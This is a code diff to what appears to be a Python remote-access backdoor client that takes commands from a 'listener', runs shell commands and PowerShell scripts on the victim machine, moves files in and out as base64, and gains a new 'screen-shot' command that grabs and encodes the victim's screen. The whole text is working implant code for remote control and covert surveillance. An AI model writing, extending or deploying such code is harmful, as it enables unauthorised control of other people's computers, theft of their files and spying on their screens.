@@ -6,6 +6,8 @@ import json
 import base64
 import time
 import platform
+from PIL import Image, ImageGrab
+import io
 # -------------------------------------------------------------------------------
 
 
@@ -47,10 +49,10 @@ def read_file(path):
         with open(path, "rb") as file:
             return base64.b64encode(file.read()).decode()
     except Exception as e:
-        return ("[-] Error " + str(e)[10:])
+        return ("[Error] " + str(e)[10:])
 
 # Download File From Listener
-def write_file(path, content):
+def write_file(path, content): 
     try:
         # desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
         # file_path = os.path.join(desktop_path, path)
@@ -59,7 +61,19 @@ def write_file(path, content):
             file.write(base64.b64decode(content))
             return "[+] Upload successful"
     except Exception as e:
-        return ("[-] Upload Unsuccessful")
+        return ("[Error] Upload Unsuccessful")
+
+def take_screenshot_and_convert_to_string():
+    try:
+        screenshot = ImageGrab.grab()
+        buffered = io.BytesIO()
+        screenshot.save(buffered, format="PNG")
+        screenshot_string = base64.b64encode(buffered.getvalue()).decode()
+        return screenshot_string 
+    except ImportError:
+        return "[Error]: PIL (Python Imaging Library) or ImageGrab module is not installed."
+    except Exception as e:
+        return f"[Error] occurred: {str(e)}"
 
 
 # -------------------------------------------------------------------------------
@@ -112,14 +126,16 @@ def receive_commands():
             file_name = os.path.basename(received_command[1])
 
             file_path = os.path.join(file_path, file_name)
-            command_result = write_file(
-                path=file_path, content=received_command[3])
+            command_result = write_file(path=file_path, content=received_command[3])
 
         elif received_command[0] == "run":
             command_result = run_powerShell_script(data=received_command[2])
 
         elif received_command[0] == "download":
             command_result = read_file(received_command[1])
+            
+        elif received_command[0] == "screen-shot":
+            command_result = take_screenshot_and_convert_to_string()
 
         else:
             command_result = execute_command(received_command)
@@ -135,14 +151,17 @@ def receive_commands():
 
 
 def run_powerShell_script(data):
-    desktop_path = os.path.join(os.path.join(
-        os.environ['USERPROFILE']), 'Desktop')
-    file_path = os.path.join(desktop_path, "test.ps1")
+    try:
+        desktop_path = os.path.join(os.path.join(
+            os.environ['USERPROFILE']), 'Desktop')
+        file_path = os.path.join(desktop_path, "test.ps1")
 
-    write_file(path=file_path, content=data)
-    result = execute_command("PowerShell -File " + file_path)
-    os.remove(file_path)
-    return result
+        write_file(path=file_path, content=data)
+        result = execute_command("PowerShell -File " + file_path)
+        os.remove(file_path)
+        return result
+    except Exception as ex:
+        return ("[Error] from run powershell script \n" + str(ex))
 
 
 def get_system_info():
